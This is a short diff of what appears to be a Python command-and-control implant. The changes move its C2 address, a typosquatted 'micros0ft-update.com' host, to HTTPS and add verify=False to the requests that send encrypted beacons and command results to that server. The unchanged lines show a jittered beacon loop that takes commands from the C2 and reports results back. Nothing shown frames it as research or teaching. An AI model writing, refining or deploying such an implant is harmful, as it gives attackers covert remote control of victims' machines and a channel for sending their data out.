@@ -3,7 +3,7 @@ import socket, platform, os, json, base64, uuid
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 
-C2_URL          = "http://micros0ft-update.com:5000"
+C2_URL          = "https://micros0ft-update.com:5000"
 BEACON_INTERVAL = 60
 JITTER          = 0.3
 
@@ -76,7 +76,8 @@ def beacon_loop():
             response = requests.post(
                 C2_URL + "/beacon",
                 json={"data": encrypted_beacon},
-                timeout=10
+                timeout=10,
+                verify=False
             )
 
             # Decrypt the response
@@ -100,7 +101,8 @@ def beacon_loop():
                 requests.post(
                     C2_URL + "/result",
                     json={"data": encrypted_result},
-                    timeout=10
+                    timeout=10,
+                    verify=False
                 )
                 print(f"[+] Result sent")
 
